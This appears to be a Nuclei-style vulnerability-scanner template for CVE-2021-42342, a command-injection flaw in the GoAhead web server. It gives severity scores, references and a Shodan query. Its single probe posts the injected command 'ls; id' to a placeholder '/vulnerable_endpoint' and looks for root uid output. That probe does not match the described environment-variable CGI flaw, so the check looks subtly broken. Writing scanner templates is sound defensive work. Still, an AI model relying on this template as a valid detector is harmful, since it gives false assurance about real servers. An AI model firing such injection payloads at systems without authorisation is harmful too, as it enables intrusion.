id: CVE-2021-42342

info:
  name: GoAhead Webserver Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered in GoAhead 4.x and 5.x before 5.1.5 where user form variables can be passed to CGI scripts without being prefixed with the CGI prefix, allowing tunneling untrusted environment variables into vulnerable CGI scripts.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary commands on the server.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/embedthis/goahead/issues/305
    - https://github.com/NaInSec/CVE-PoC-in-GitHub
    - https://github.com/Threekiii/Vulhub-Reproduce
    - https://github.com/d4n-sec/d4n-sec.github.io
    - https://github.com/soosmile/POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-42342
    cwe-id: CWE-434
    epss-score: 0.11778
    epss-percentile: 0.95519
    cpe: cpe:2.3:a:embedthis:goahead:*:*:*:*:*:*:*:*
  metadata:
    vendor: embedthis
    product: goahead
    shodan-query: cpe:"cpe:2.3:a:embedthis:goahead"

http:
  - method: POST
    path:
      - "{{BaseURL}}/vulnerable_endpoint"

    headers:
      Content-Type: application/json

    body: |
      {
        "command": "ls; id"
      }
    matchers:
      - type: word
        words:
          - "uid=0(root) gid=0(root) groups=0(root)"
        part: body
